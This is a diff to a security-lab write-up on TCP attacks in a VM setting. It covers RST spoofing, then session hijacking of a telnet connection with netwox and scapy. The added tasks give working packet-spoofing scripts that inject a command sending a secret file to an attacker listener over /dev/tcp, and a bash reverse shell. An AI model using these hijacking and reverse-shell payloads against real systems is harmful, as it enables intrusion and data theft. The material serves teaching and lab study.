@@ -256,7 +256,6 @@ Assume that a user is watching YouTube video from the VM `10.0.2.4` (For better 
 We can run a [`auto_rst`](./auto_rst.py) program to spoof an RST packet with proper `seq` and `ack` numbers whenever capturing a TCP packet from the user IP.
 
 ```python
-#!/usr/bin/python3
 from scapy.all import *
 
 def spoof_tcp(pkt):
@@ -283,3 +282,163 @@ sudo netwox 78 --filter "src host 10.0.2.5"
 ```
 
 ![](./ytb_rst_2.png)
+
+# Task 4
+
+First, assume the user establishes a `telnet` connection from the user to the server. There is a secret file `/home/seed/secret` on the server, if not, just create it.
+
+```
+echo "This is a secret file" > /home/seed/secret
+```
+
+Then, on the attacker machine, prepare a port (e.g. 9090) to get the data:
+
+```
+nc -lv 9090
+```
+
+## Netwox
+
+Encode the payload `'\r cat /home/seed/secret > /dev/tcp/10.0.2.15/9090\r'` into a hex string:
+
+```
+$ python
+Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
+[GCC 5.4.0 20160609] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> '\r cat /home/seed/secret > /dev/tcp/10.0.2.15/9090\r'.encode('HEX')
+'0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f31302e302e322e31352f393039300d'
+```
+
+Since the last `telnet` packet from the server to the user captured by Wireshark is:
+
+> Transmission Control Protocol, Src Port: 57640, Dst Port: 23, Seq: 1386528330, Ack: 1227064343, Len: 2
+>     **Source Port: 57640**
+>     Destination Port: 23
+>     [Stream index: 0]
+>     [TCP Segment Len: 2]
+>     **Sequence number: 1386528330**
+>     **[Next sequence number: 1386528332]**
+>     **Acknowledgment number: 1227064343**
+>     Header Length: 32 bytes
+>     Flags: 0x018 (PSH, ACK)
+>     Window size value: 237
+>     [Calculated window size: 30336]
+>     [Window size scaling factor: 128]
+>     Checksum: 0x5fbc [unverified]
+>     [Checksum Status: Unverified]
+>     Urgent pointer: 0
+>     Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
+>     [SEQ/ACK analysis]
+
+Ref to the [documentation] of `netwox` tool 40, run such a command with correct parameters on the attacker machine:
+
+```
+sudo netwox 40 -l "10.0.2.5" -m "10.0.2.4" -o 57640 -p 23 -q 1386528332 -E 2000 -r 1227064343 -z -H "0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f31302e302e322e31352f393039300d"
+```
+
+And now we get the content of the secret file on the server:
+
+![](./hijack_1.png)
+
+## Scapy
+
+Similarly, the task can be done with `scapy`.
+
+Assume the last packet from the user to the server is:
+
+> Transmission Control Protocol, Src Port: 57644, Dst Port: 23, Seq: 1727979555, Ack: 435127836, Len: 2
+>     **Source Port: 57644**
+>     Destination Port: 23
+>     [Stream index: 3]
+>     [TCP Segment Len: 2]
+>     Sequence number: 1727979555
+>     **[Next sequence number: 1727979557]**
+>     **Acknowledgment number: 435127836**
+>     Header Length: 32 bytes
+>     Flags: 0x018 (PSH, ACK)
+>     Window size value: 229
+>     [Calculated window size: 29312]
+>     [Window size scaling factor: 128]
+>     Checksum: 0xbfe0 [unverified]
+>     [Checksum Status: Unverified]
+>     Urgent pointer: 0
+>     Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
+>     [SEQ/ACK analysis]
+
+Construct the spoofed packet using [`sessionhijack.py`](./sessionhijack.py):
+
+```python
+import sys
+from scapy.all import *
+
+print("SENDING SESSION HIJACKING PACKET.........")
+IPLayer = IP(src="10.0.2.5", dst="10.0.2.4")
+TCPLayer = TCP(sport=57644, dport=23, flags="A",
+               seq=1727979557, ack=435127836)
+Data = "\r cat /home/seed/secret > /dev/tcp/10.0.2.15/9090\r"
+pkt = IPLayer/TCPLayer/Data
+ls(pkt)
+send(pkt,verbose=0)
+```
+
+It also can steal the secret file:
+
+![](./hijack_2.png)
+
+**Note**: After a successful attack, the user terminal freezes in the session.
+
+## Task 5
+
+Similar to [Task 4](#task-4), except that the payload should be
+
+```
+\r /bin/bash -i > dev/tcp/10.0.2.15/9090 2>&1 0<&1 \r
+```
+to create a reversed shell from the server to the attacker.
+
+So repeat the steps in previously task, to simplify, I just demonstrate with `scapy`:
+
+As above, capture the last `telnet` packet from the user to the server using Wireshark:
+
+> Transmission Control Protocol, Src Port: 57654, Dst Port: 23, Seq: 1265743785, Ack: 4268626928, Len: 2
+>     **Source Port: 57654**
+>     Destination Port: 23
+>     [Stream index: 12]
+>     [TCP Segment Len: 2]
+>     Sequence number: 1265743785
+>     **[Next sequence number: 1265743787]**
+>     **Acknowledgment number: 4268626928**
+>     Header Length: 32 bytes
+>     Flags: 0x018 (PSH, ACK)
+>     Window size value: 229
+>     [Calculated window size: 29312]
+>     [Window size scaling factor: 128]
+>     Checksum: 0x965f [unverified]
+>     [Checksum Status: Unverified]
+>     Urgent pointer: 0
+>     Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
+>     [SEQ/ACK analysis]
+
+
+
+Use Python script to spoof the packet:
+
+
+```python
+import sys
+from scapy.all import *
+
+print("SENDING SESSION HIJACKING PACKET.........")
+IPLayer = IP(src="10.0.2.5", dst="10.0.2.4")
+TCPLayer = TCP(sport=57654, dport=23, flags="A",
+               seq=1265743787, ack=4268626928)
+Data = "\r /bin/bash -i > /dev/tcp/10.0.2.15/9090 2>&1 0<&1 \r"
+pkt = IPLayer/TCPLayer/Data
+ls(pkt)
+send(pkt,verbose=0)
+```
+
+Finally, the reverse shell is created successfully:
+
+![Reverse shell controls the server machine](./rev_shell.png)
